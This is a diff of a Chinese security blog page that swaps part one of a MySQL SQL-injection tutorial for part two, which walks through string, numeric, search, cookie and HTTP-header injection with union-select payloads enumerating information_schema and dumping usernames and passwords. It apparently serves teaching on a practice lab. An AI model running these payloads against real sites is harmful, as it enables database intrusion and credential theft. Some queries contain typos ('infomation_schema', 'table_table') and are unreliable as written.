@@ -6,22 +6,47 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://wh1tecell.top">
-  <title>sql注入之mysql学习基础(一) | Wh1tecell&#39;blog</title>
+  <title>sql注入之mysql学习基础(二) | Wh1tecell&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="了解什么是sql注入及mysql数据库介绍">
+  <meta name="description" content="介绍几种常见的mysql注入类型">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入之mysql学习基础(一)">
-<meta property="og:url" content="https://wh1tecell.top/2020/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/index.html">
+<meta property="og:title" content="sql注入之mysql学习基础(二)">
+<meta property="og:url" content="https://wh1tecell.top/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/index.html">
 <meta property="og:site_name" content="Wh1tecell&#39;blog">
-<meta property="og:description" content="了解什么是sql注入及mysql数据库介绍">
+<meta property="og:description" content="介绍几种常见的mysql注入类型">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAaGcQ.png">
-<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAalh8.png">
-<meta property="article:published_time" content="2020-01-05T04:58:15.000Z">
-<meta property="article:modified_time" content="2021-01-05T15:30:09.236Z">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAayjJ.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAabDA.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAaj4f.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAdibn.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAdE5V.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAdZCT.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAdm2F.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAd1V1.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAdt2D.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAdgxg.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAd5aq.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAdTiV.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAdXL9.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAdzIx.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAwPzD.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200618112825139.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAwksH.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAwALd.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAwZdI.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAwnFP.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAw1yQ.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAwYoq.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAwfSO.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sAwbkt.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sA0FhV.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sA0VcF.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/05/sA0u7R.png">
+<meta property="article:published_time" content="2021-01-05T11:58:15.000Z">
+<meta property="article:modified_time" content="2021-01-05T15:33:43.808Z">
 <meta property="article:author" content="Wh1tecell">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s3.ax1x.com/2021/01/05/sAaGcQ.png">
+<meta name="twitter:image" content="https://s3.ax1x.com/2021/01/05/sAayjJ.png">
   
     <link rel="alternative" href="/atom.xml" title="Wh1tecell&#39;blog" type="application/atom+xml">
   
@@ -160,20 +185,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-sql注入之mysql学习基础(一)" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sql注入之mysql学习基础(二)" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      sql注入之mysql学习基础(一)
+      sql注入之mysql学习基础(二)
     </h1>
   
 
         
-        <a href="/2020/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/" class="archive-article-date">
-  	<time datetime="2020-01-05T04:58:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-05</time>
+        <a href="/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/" class="archive-article-date">
+  	<time datetime="2021-01-05T11:58:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-05</time>
 </a>
         
       </header>
@@ -183,16 +208,25 @@
         
     <div class="article-entry" itemprop="articleBody">
       
-        <p>了解什么是sql注入及mysql数据库介绍</p>
+        <p>介绍几种常见的mysql注入类型</p>
 <a id="more"></a>
 
-<h1 id="MySQL的数据库结构"><a href="#MySQL的数据库结构" class="headerlink" title="MySQL的数据库结构"></a>MySQL的数据库结构</h1><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
-<h1 id="注入的产生"><a href="#注入的产生" class="headerlink" title="注入的产生"></a>注入的产生</h1><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
-<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
-<h1 id="MySQL5注入的一般流程"><a href="#MySQL5注入的一般流程" class="headerlink" title="MySQL5注入的一般流程"></a>MySQL5注入的一般流程</h1><p>获取字段数-查库名-查表名-查列名-查数据</p>
-<p>获取字段数：order by 临界值<br>获取库名：database()<br>表名和列名没有内置函数 怎么查？</p>
-<p>union语句：将不同表的两个列查询的数据去重拼接<br>union all ：不去重</p>
-<p>获取MySQL版本：version()<br>MySQL5.0以下版本只能和access数据库一样猜解<br>而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>information_schema.tables 记录表名信息<br>information_schema.columns 记录列名信息<br>TABLE_SCHEMA 数据库字段<br>table_name 表名<br>column_name 列名<br>查表名：<br>SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>查列名：<br>SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>查数据：<br>select 列名 from 库名.表名</p>
+<h1 id="MySQL注入"><a href="#MySQL注入" class="headerlink" title="MySQL注入"></a>MySQL注入</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>有这几种常见情况,闭合SQL语句，再插入我们需要的sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id= &#x27;$id&#x27;&quot;;</span><br><span class="line">闭合前面的单引号把后面的单引号注释掉跟上<span class="keyword">sql</span>语句</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27; ))</span><br><span class="line">闭合单引号，闭合两个括号把后面的都注释掉跟上sql语句</span><br><span class="line">$sql=&quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>)&quot;;</span><br><span class="line">闭合单引号，闭合括号把后面的都注释掉跟上sql语句</span><br><span class="line">$id =&#x27;&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;&#x27;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">闭合前面的双引号再注释后面的双引号</span><br><span class="line">$id = &#x27;(&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;)&#x27;;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">1234567891011</span><br></pre></td></tr></table></figure>
+<h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>字符型和数字型的区别在于接受的参数id的类型和数据库中id的字段类型<br>其实和字符型的注入方式是一样的，不必过度纠结于两者具体的区别</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id&quot;;</span><br></pre></td></tr></table></figure>
+<h3 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h3><p>就是post型的提交方式<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAayjJ"><img src="https://s3.ax1x.com/2021/01/05/sAayjJ.png" alt="sAayjJ.png"></a></p>
+<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAabDA"><img src="https://s3.ax1x.com/2021/01/05/sAabDA.png" alt="sAabDA.png"></a></p>
+<h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><p>X-Forwarded-For<br>X-Forwarded-For是HTTP头的一个字段。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准。类似的还有如下几种<br>X-Originating-IP: 127.0.0.1<br>X-Forwarded-For: 127.0.0.1<br>X-Remote-IP: 127.0.0.1<br>X-Remote-Addr: 127.0.0.1<br>Client-IP: 127.0.0.1<br>User-agent<br>用户代理(user agent)是记录软件程序的客户端信息的HTTP头字段，他可以用来统计目标和违规协议。在HTTP头中应该包含它，这个字段的第一个空格前面是软件的产品名称，后面有一个可选的斜杠和版本号。并不是所有的应用程序都会被获取到user-agent信息，但是有些应用程序利用它存储一些信息(如:购物车)。在这种情况下，我们就有必要研究下user-agent头存在的问题了。<br>Referer<br>Referer是另外一个当应用程序没有过滤存储到数据库时，容易发生SQL注入的HTTP头。它是一个允许客户端指定的可选头部字段，通过它我们可以获取到提交请求URI的服务器情况。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAaj4f"><img src="https://s3.ax1x.com/2021/01/05/sAaj4f.png" alt="sAaj4f.png"></a></p>
+<h2 id="具体实例"><a href="#具体实例" class="headerlink" title="具体实例"></a>具体实例</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><h4 id="一般类型"><a href="#一般类型" class="headerlink" title="一般类型"></a>一般类型</h4><p>因为不知道接收的id是1或者是”1”的形式我们先当成数字型注入<br>如何判断：’url?id=1+1’如果成功返回数据则为数字型注入<code>+</code>=<code>%2b</code><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAdibn"><img src="https://s3.ax1x.com/2021/01/05/sAdibn.png" alt="sAdibn.png"></a><br>首先查字段<br>url?id = 1 order by 3 不报错<br>url?id = 1 order by 4 报错<br>所以有三个字段<br>接下来使用联合查询:<code>url?id = 1 union select 1,2,3</code><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAdE5V"><img src="https://s3.ax1x.com/2021/01/05/sAdE5V.png" alt="sAdE5V.png"></a><br>查当前数据库名，版本，用户<br><code>url?id = 1 union select database(),version(),user()</code><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAdZCT"><img src="https://s3.ax1x.com/2021/01/05/sAdZCT.png" alt="sAdZCT.png"></a><br>查询有什么表<br><code>url?id = 1 union select 1,2,table_name from infomation_schema.tables where table_schema = database()</code><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAdm2F"><img src="https://s3.ax1x.com/2021/01/05/sAdm2F.png" alt="sAdm2F.png"></a><br>查询列名：<br><code>url?id = 1 union select 1,2,column_name from infomation_schema.columns where table_table = &#39;users&#39;</code><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAd1V1"><img src="https://s3.ax1x.com/2021/01/05/sAd1V1.png" alt="sAd1V1.png"></a><br>查询数据：<br><code>url?id = 1 union select id,username,password from users</code><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAdt2D"><img src="https://s3.ax1x.com/2021/01/05/sAdt2D.png" alt="sAdt2D.png"></a></p>
+<h4 id="被单引号包裹起来的"><a href="#被单引号包裹起来的" class="headerlink" title="被单引号包裹起来的"></a>被单引号包裹起来的</h4><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAdgxg"><img src="https://s3.ax1x.com/2021/01/05/sAdgxg.png" alt="sAdgxg.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAd5aq"><img src="https://s3.ax1x.com/2021/01/05/sAd5aq.png" alt="sAd5aq.png"></a><br>在之后我们拼接and 1=1 and 1= 2,发现没有报错<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAdTiV"><img src="https://s3.ax1x.com/2021/01/05/sAdTiV.png" alt="sAdTiV.png"></a><br>之后加上<code>id = 1&#39;</code>单引号后报错，不正常说明sql语句可控<br>在Mysql中<code>--+</code>代表注释此时<code>id = 1&#39;--+</code>成功执行<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAdXL9"><img src="https://s3.ax1x.com/2021/01/05/sAdXL9.png" alt="sAdXL9.png"></a><br>之后插上<code>id = 1 and 1=2&#39;-- +</code>不正常，即可食用之后类似上面一般类型</p>
+<h4 id="双引号加小括号包裹"><a href="#双引号加小括号包裹" class="headerlink" title="双引号加小括号包裹"></a>双引号加小括号包裹</h4><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAdzIx"><img src="https://s3.ax1x.com/2021/01/05/sAdzIx.png" alt="sAdzIx.png"></a><br>首先查看<code>id = 1</code><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAwPzD"><img src="https://s3.ax1x.com/2021/01/05/sAwPzD.png" alt="sAwPzD.png"></a><br>类似上面<code>?id = 1&#39;) and 1 = 2-- +</code>发现1=1和1=2成功执行</p>
+<h4 id="两个括号"><a href="#两个括号" class="headerlink" title="两个括号"></a>两个括号</h4><p><img src="https://img-blog.csdnimg.cn/20200618112825139.png" alt="在这里插入图片描述"><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAwksH"><img src="https://s3.ax1x.com/2021/01/05/sAwksH.png" alt="sAwksH.png"></a><br>采用<code>? id = 1&#39;)) union select 1,2,3 -- +</code></p>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>如果在url后拼接<code>?id=1 and 1=1</code>or<code>and 1=2</code>分别正确错误则说明为字符型注入<br>注入方式和数字型类似</p>
+<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAwALd"><img src="https://s3.ax1x.com/2021/01/05/sAwALd.png" alt="sAwALd.png"></a><br>%代表%前面可以有字符后面也可以有<br>配合HackBar食用<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAwZdI"><img src="https://s3.ax1x.com/2021/01/05/sAwZdI.png" alt="sAwZdI.png"></a><br>post数据<code>name = a&#39; union select 1,2,3 -- +</code></p>
+<h3 id="Cookie注入-1"><a href="#Cookie注入-1" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAwnFP"><img src="https://s3.ax1x.com/2021/01/05/sAwnFP.png" alt="sAwnFP.png"></a><br>配合Burp使用<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAw1yQ"><img src="https://s3.ax1x.com/2021/01/05/sAw1yQ.png" alt="sAw1yQ.png"></a><br>改为<code>Cookie: uid = 1 union select 1,2,3</code></p>
+<h3 id="HTTP头注入-1"><a href="#HTTP头注入-1" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAwYoq"><img src="https://s3.ax1x.com/2021/01/05/sAwYoq.png" alt="sAwYoq.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAwfSO"><img src="https://s3.ax1x.com/2021/01/05/sAwfSO.png" alt="sAwfSO.png"></a></p>
+<p>配合Burp食用<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sAwbkt"><img src="https://s3.ax1x.com/2021/01/05/sAwbkt.png" alt="sAwbkt.png"></a><br>添加XFF头<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sA0FhV"><img src="https://s3.ax1x.com/2021/01/05/sA0FhV.png" alt="sA0FhV.png"></a><br>完美成功!!!<br><code>127.0.0.1&#39; order by 4-- +</code>成功，配合联合查询即可！！！<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sA0VcF"><img src="https://s3.ax1x.com/2021/01/05/sA0VcF.png" alt="sA0VcF.png"></a><br>看图<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/sA0u7R"><img src="https://s3.ax1x.com/2021/01/05/sA0u7R.png" alt="sA0u7R.png"></a></p>
 
       
       
@@ -227,7 +261,7 @@
     
     <br>
     <strong>本文链接：</strong>
-    https://wh1tecell.top/2020/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/
+    https://wh1tecell.top/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/
     <br>
     <strong>版权声明：</strong>
     本作品采用
@@ -313,7 +347,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://wh1tecell.top/2020/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://wh1tecell.top/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -327,15 +361,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          sql注入之mysql学习基础(二)
-        
-      </div>
-    </a>
   
+    <a href="/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sql注入之mysql学习基础(一)</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
@@ -360,7 +390,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text">MySQL的数据库结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="toc-number">2.</span> <span class="toc-text">注入的产生</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL5%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">MySQL5注入的一般流程</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">MySQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">基本介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">字符型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">数字型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">搜索型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.</span> <span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.</span> <span class="toc-text">HTTP头注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">具体实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">数字型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">一般类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8C%85%E8%A3%B9%E8%B5%B7%E6%9D%A5%E7%9A%84"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">被单引号包裹起来的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8A%A0%E5%B0%8F%E6%8B%AC%E5%8F%B7%E5%8C%85%E8%A3%B9"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">双引号加小括号包裹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AA%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">两个括号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text">搜索型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.2.5.</span> <span class="toc-text">HTTP头注入</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
